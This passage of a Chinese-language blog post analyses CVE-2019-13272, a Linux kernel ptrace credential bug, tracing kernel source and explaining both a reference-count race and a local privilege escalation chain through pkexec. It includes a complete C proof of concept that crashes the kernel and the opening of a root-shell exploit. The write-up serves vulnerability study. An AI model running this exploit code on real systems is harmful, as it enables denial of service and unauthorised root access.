all caps.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        <span class="comment">// 我们主要关注这里，这里会检查 ptracer_cred 的命名空间是否是新进程命名空间的父命名空间</span></span><br><span class="line">        <span class="comment">// 若是，检查是否新进程命名空间的所有者是否与 ptracer 为同一用户</span></span><br><span class="line">        <span class="comment">// 若是，返回 0，说明通过检查</span></span><br><span class="line">        <span class="comment">// 若否，向上遍历命名空间，回到开头</span></span><br><span class="line">		<span class="keyword">if</span> ((ns-&gt;parent == cred-&gt;user_ns) &amp;&amp; uid_eq(ns-&gt;owner, cred-&gt;euid))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If you have a capability in a parent user ns, then you have</span></span><br><span class="line"><span class="comment">		 * it over all children user namespaces as well.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ns = ns-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We never get here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会检查 ptracee 的命名空间所有者是否与 ptracer 为同一用户，<strong>只有这两者同属同一用户，检查才能通过，否则检查将不会通过，从而导致降权</strong></p>
<p>接下来的判断语句中调用的 <code>ns_capable()</code> 函数最终也会走到这个路径，这里便不再赘叙，感兴趣的可以自行检索阅读如下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ns_capable()</span><br><span class="line">	ns_capable_common()</span><br><span class="line">        security_capable()</span><br><span class="line">            cap_capable()</span><br></pre></td></tr></table></figure>

<p>由此我们得到结论：<strong>若 ptracee 进程执行 suid&#x2F;sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid&#x2F;egid 执行程序，而非文件的 suid&#x2F;sgid</strong></p>
<h2 id="LSM-与-ptracer-权限检查"><a href="#LSM-与-ptracer-权限检查" class="headerlink" title="LSM 与 ptracer 权限检查"></a>LSM 与 ptracer 权限检查</h2><p>前面我们讲了对 ptracee 执行新程序的权限检查，现在我们来看对于 ptracer 操作的检查</p>
<p>将目光放回 ptrace 系统调用的源码中，对于 ptracer 的 <code>PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA</code> 这几个操作，会走入如下路径：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    arch_ptrace()</span><br><span class="line">    	ptrace_request()</span><br><span class="line">    		generic_ptrace_peekdata() / generic_ptrace_pokedata()</span><br><span class="line">    			ptrace_access_vm()</span><br><span class="line">    				ptracer_capable()</span><br><span class="line">    					security_capable_noaudit()</span><br></pre></td></tr></table></figure>

<p>这里就又走回我们上面的路径了，不再重复分析，这里简单说明一点就是在 <code>ptrace_request()</code> 中传给下层被调函数的 task 参数为 ptracee 的 task_struct，在 <code>ptrace_access_vm()</code> 中传入的命名空间也为 ptracee 的 mm 的命名空间，因此<strong>最后权限判断还是根据 ptracee 进程的</strong> <code>ptracer_cred</code> <strong>字段</strong></p>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>细心的读者或许已经观察到了，前面我们的预备知识中缺少了<strong>设置 ptracee 的 ptracer_cred 字段</strong>这一过程，实际上<strong>我们的漏洞便是出现在这个位置</strong></p>
<p>我们将目光重新放回 ptrace 系统调用的源码当中，当 ptracee 进程调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL);</code> 时，会走到如下路径：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    ptrace_traceme()</span><br><span class="line">    	__ptrace_link()</span><br></pre></td></tr></table></figure>

<p>其中 <code>__ptrace_link()</code> 函数<strong>就是本次出现漏洞的函数</strong>，该函数用于建立 ptrace link，定义于 <code>/kernel/ptrace.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ptrace a task: make the debugger its new parent and</span></span><br><span class="line"><span class="comment"> * move it to the ptrace list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Must be called with the tasklist lock write-held.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __ptrace_link(<span class="keyword">struct</span> task_struct *child, <span class="keyword">struct</span> task_struct *new_parent)</span><br><span class="line">&#123;</span><br><span class="line">	BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));</span><br><span class="line">	list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced);</span><br><span class="line">	child-&gt;parent = new_parent;</span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	child-&gt;ptracer_cred = get_cred(__task_cred(new_parent));</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的功能比较简单，主要就是在 rcu 机制下将子进程的 <code>ptracer_cred</code> 字段设为<strong>父进程的 cred</strong>，这里的 <code>__task_cred()</code> 宏的作用主要是 rcu 机制下取得进程 real_cred，而 <code>get_cred()</code> 函数主要是将 cred 的引用计数 + 1</p>
<blockquote>
<p>RCU 机制即 ready-copy update ，该机制确保了多线程下读与写的同步，这里不详细介绍，原理可以简单理解为“节点更新”——读无限制，要写时先新建节点写入新节点，随后将节点更新到指针，这个过程中读者读的都是旧节点，随后等待读者退出，释放旧节点，新节点投入使用</p>
</blockquote>
<p>按照  Jann Horn 的 <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee">issue</a> 阐述，在这里存在着<strong>两个问题</strong>：</p>
<ul>
<li>竞态条件下导致错误的引用计数</li>
<li>ptracer_cred 设置的逻辑错误导致本地提权</li>
</ul>
<p>下面我们来逐一分析</p>
<h2 id="竞态条件下导致错误的引用计数"><a href="#竞态条件下导致错误的引用计数" class="headerlink" title="竞态条件下导致错误的引用计数"></a>竞态条件下导致错误的引用计数</h2><p>在 <code>__ptrace_link()</code> 函数中调用了 <code>get_cred()</code> 函数获取父进程的 cred，该函数会将其引用计数 + 1，这看起来<strong>好像没有什么问题</strong>，不是么？我们引用了父进程的 cred，自然引用计数要 + 1，当 ptrace 流程结束后，引用计数再 - 1，这一切看起来似乎很正常</p>
<p>咋一看这个流程设计似乎是没有问题的，但在竞态条件下就不一定了，我们现在将目光放到一个对于 kernel pwner 而言或许都很熟悉但不一定曾深入研究过的一个函数——<code>commit_creds</code>，该函数定义于 <code>kernel/cred.c</code> 中，我们主要关注如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	put_cred(old);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在该函数末尾会两次调用 <code>put_cred()</code> 函数，该函数定义于 <code>/include/linux/cred.h</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_cred</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *_cred)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> (<span class="keyword">struct</span> cred *) _cred;</span><br><span class="line"></span><br><span class="line">	validate_creds(cred);</span><br><span class="line">	<span class="keyword">if</span> (atomic_dec_and_test(&amp;(cred)-&gt;usage))</span><br><span class="line">		__put_cred(cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到其功能比较简单，一是调用 <code>validate_cred()</code> 验证 cred 是否合法，随后使用 <code>atomic_dec_and_test</code> 宏将 cred 的引用计数减一，并确认其引用计数是否为 0，若为 0 则调用 <code>__put_cred()</code></p>
<p>通常来说，在 commit_creds 两次减去引用计数（cred 一次，real_cred 一次）后最终执行流都会走到 <code>__put_cred()</code>，该函数定义于 <code>/kernel/cred.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __put_cred - Destroy a set of credentials</span></span><br><span class="line"><span class="comment"> * @cred: The record to release</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Destroy a set of credentials on which no references remain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *cred)</span><br><span class="line">&#123;</span><br><span class="line">	kdebug(<span class="string">&quot;__put_cred(%p&#123;%d,%d&#125;)&quot;</span>, cred,</span><br><span class="line">	       <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">	       read_cred_subscribers(cred));</span><br><span class="line"></span><br><span class="line">	BUG_ON(<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	BUG_ON(read_cred_subscribers(cred) != <span class="number">0</span>);</span><br><span class="line">	cred-&gt;magic = CRED_MAGIC_DEAD;</span><br><span class="line">	cred-&gt;put_addr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	BUG_ON(cred == current-&gt;cred);</span><br><span class="line">	BUG_ON(cred == current-&gt;real_cred);</span><br><span class="line"></span><br><span class="line">	call_rcu(&amp;cred-&gt;rcu, put_cred_rcu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们看到其一开始先验证 cred 的引用计数，随后调用 <code>call_rcu()</code>，该函数的作用可以简单理解为在 rcu 机制下调用函数指针，这里调用的是 <code>put_cred_rcu()</code> 函数，定义于 <code>/kernel/cred.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The RCU callback to actually dispose of a set of credentials</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cred_rcu</span><span class="params">(<span class="keyword">struct</span> rcu_head *rcu)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> container_of(rcu, <span class="keyword">struct</span> cred, rcu);</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;put_cred_rcu(%p)&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">if</span> (cred-&gt;magic != CRED_MAGIC_DEAD ||</span><br><span class="line">	    <span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span> ||</span><br><span class="line">	    read_cred_subscribers(cred) != <span class="number">0</span>)</span><br><span class="line">		panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with&quot;</span></span><br><span class="line">		      <span class="string">&quot; mag %x, put %p, usage %d, subscr %d\n&quot;</span>,</span><br><span class="line">		      cred, cred-&gt;magic, cred-&gt;put_addr,</span><br><span class="line">		      <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">		      read_cred_subscribers(cred));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>)</span><br><span class="line">		panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with usage %d\n&quot;</span>,</span><br><span class="line">		      cred, <span class="type">atomic_read</span>(&amp;cred-&gt;usage));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	security_cred_free(cred);</span><br><span class="line">	key_put(cred-&gt;session_keyring);</span><br><span class="line">	key_put(cred-&gt;process_keyring);</span><br><span class="line">	key_put(cred-&gt;thread_keyring);</span><br><span class="line">	key_put(cred-&gt;request_key_auth);</span><br><span class="line">	<span class="keyword">if</span> (cred-&gt;group_info)</span><br><span class="line">		put_group_info(cred-&gt;group_info);</span><br><span class="line">	free_uid(cred-&gt;user);</span><br><span class="line">	put_user_ns(cred-&gt;user_ns);</span><br><span class="line">	kmem_cache_free(cred_jar, cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见其会判断 cred 的引用计数是否为 0，<strong>若不为 0 则会导致 kernel panic</strong>，在正常情况下则是常规的将 cred 释放回 cred_jar 这一 slub 的流程</p>
<p>看起来好像没什么问题，在进入释放函数前已有一次检查，想必没有可能引起 kernel panic，<strong>实则不然</strong>，我们考虑如下竞态场景：</p>
<ul>
<li>父进程不断地更新自身 cred</li>
<li>子进程不断地调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code></li>
</ul>
<p>在这种场景下，若是父进程在更新自身 cred 时，在父进程替换自身 cred 之前子进程获取到了父进程的旧 cred，在父进程进入到 <code>put_cred_rcu</code> 函数之后子进程刚好才将旧 cred 的引用计数 +1，此时便<strong>无法通过释放函数中的引用计数检查，从而造成 kernel panic</strong></p>
<h2 id="ptracer-cred-设置的逻辑错误导致本地提权"><a href="#ptracer-cred-设置的逻辑错误导致本地提权" class="headerlink" title="ptracer_cred 设置的逻辑错误导致本地提权"></a>ptracer_cred 设置的逻辑错误导致本地提权</h2><p>这个逻辑漏洞的利用在笔者看来<strong>十分巧妙</strong>，在正常情况下普通权限的 ptracer 确乎是无法调试执行 suid 程序的 pracee 的，但是 Jann Horn 提出了一个十分巧妙的<strong>多级 ptrace 方案</strong></p>
<p>我们现在来考虑如下场景：</p>
<ul>
<li>进程 A fork 出子进程 B</li>
<li>进程 B fork 出子进程 C</li>
<li>进程 B 执行一个<strong>先提权后降权的</strong> suid 程序</li>
<li>进程 C 检测到进程 B 提权后发起 <code>PTRACE_RTRACEME</code> 请求，随后执行一个 suid 程序，此时因为进程 B 已经提权所以 ptrace link 建立成功，<strong>此时进程 C 为 root 权限</strong></li>
<li>进程 A 检测到进程 B 执行 suid 程序后，主动 ptrace attach 进程 B</li>
<li>此时<strong>进程 B 已经完成降权，故进程 A 可以 ptrace 进程 B，而进程 B 已经与进程 C 建立了 ptrace link，此时进程 C 在判断进程 B 权限时使用的是此前保存的 root cred，故进程 B 可以 ptrace 进程 C 让其在 root 权限下执行恶意代码</strong></li>
</ul>
<p>听起来似乎需要一些条件竞争？而且我们似乎很难找到这样一个 suid 程序，<strong>这令这个漏洞变得十分的鸡肋</strong>，我们只能在一些特定发行版下完成利用</p>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><h2 id="利用竞态条件造成-kernel-panic"><a href="#利用竞态条件造成-kernel-panic" class="headerlink" title="利用竞态条件造成 kernel panic"></a>利用竞态条件造成 kernel panic</h2><p>前面我们已经讲到开两个进程进行竞争便能触发 kernel panic，而合法更新父进程的 cred 的方式有很多，例如 <code>setresuid</code> 这一系列的系统调用便能合法更新进程的 cred，这里我们便选用 setresuid 系统调用</p>
<p>exp 如下，这里参考了 jannh 给出的 poc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">ptraceThread</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> child;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of kernel panic.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uid = getuid();</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            setresuid(uid, uid, uid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_create(&amp;child, <span class="literal">NULL</span>, ptraceThread, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://s2.loli.net/2022/01/14/Cl1RPwcj5s8OLrf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>可以看到的是我们成功利用该漏洞造成了 kernel panic</p>
<h2 id="利用逻辑错误进行本地提权"><a href="#利用逻辑错误进行本地提权" class="headerlink" title="利用逻辑错误进行本地提权"></a>利用逻辑错误进行本地提权</h2><p>我们先介绍一个新玩意——<code>PolKit</code>，这是一个应用程序框架，相比起 sudo 等传统特权授权程序，polkit 可以进行更细粒度的权限授予，这里不深入研究其用法</p>
<p>接下来我们需要用到一个大部分 Linux 桌面发行版都有的 suid 程序—— <code>pkexec</code>，这是 polkit 中的工具之一，其允许获得授权的用户以另一用户的身份执行特定程序，如下是我们将会用到的指令执行格式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pkexec -user username some_programme_under_polkit</span></span><br></pre></td></tr></table></figure>

<p>当我们使用 <code>-user</code> 参数时， pkexec 会<strong>先将进程提权到 root，之后再降权到指定用户</strong>，这恰好可以用来构造我们 ptrace 利用链上的进程 B</p>
<p>此外，我们需要执行一个<strong>在 polkit 框架下运行的可执行程序</strong>（Jann Horn 称之为 helper），helper 需要满足的是<strong>普通用户执行时不需要认证</strong>（很多 polkit 程序执行时都需要弹窗认证）</p>
<p>接下来我们解决利用流程中条件竞争的问题，这里我们可以使用_管道_来控制程序执行的时机，从而让对应的三个进程能够在对应时机执行对应操作</p>
<p>下面我们分阶段对 exp 进行讲解，这里的 exp 笔者参考了 Jann 的exp 进行重新编写，经过笔者的一些<del>自以为是的</del>优化</p>
<h3 id="Setp-I-task-A-fork-task-B"><a href="#Setp-I-task-A-fork-task-B" class="headerlink" title="Setp.I task A fork task B"></a>Setp.I task A fork task B</h3><p>这里的 main 函数笔者设计为主要实现 task A 的功能，同时也作为后面 task B 与 task C 通过 execveat 替换自身镜像时的跳转入口</p>
<p>findHelper() 用以寻找当前平台可用的 helper，不再赘叙</p>
<p>task A 首先需要创建一个管道，后面我们需要将 task B 的 stdout 重定向至该管道以让其堵塞，因此我们需要将管道设为 <code>O_DIRECT</code> 模式，这意味着该管道传输数据的方式是按 “packet” 进行传输的，随后我们先往其中填充一个 packet，后面 task B 在写入  stdout 时便会堵塞（为什么要阻塞后面细说）</p>
<p>创建完成管道之后便 fork 出 task B，接下来我们来看 task B 的流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h3 id="Step-II-task-B-fork-task-C"><a href="#Step-II-task-B-fork-task-C" class="headerlink" title="Step.II task B fork task C"></a>Step.II task B fork task C</h3><p>task B 主要的工作笔者都将其封装在 <code>middlePtracee()</code> 中，首先还是 fork 出 task C，<strong>此时 task A 与 task C 都在监视 task B 的状态</strong></p>
<p>接下来 task B 将自身的 stdin 重定向自 <code>/proc/self/exe</code> ，<strong>将 stdout 重定向至阻塞的管道</strong>，这是因为在接下来我们执行 pkexec 时，pkexec 的输出走 stderr，因此提权-&gt;降权这一流程并不会阻塞，而 pkexec 执行的 helper 的输出则走 stdout，<strong>此时程序会阻塞在这里，且 task B 已经降权，因此 task A 可以借此时机接管 task B</strong></p>
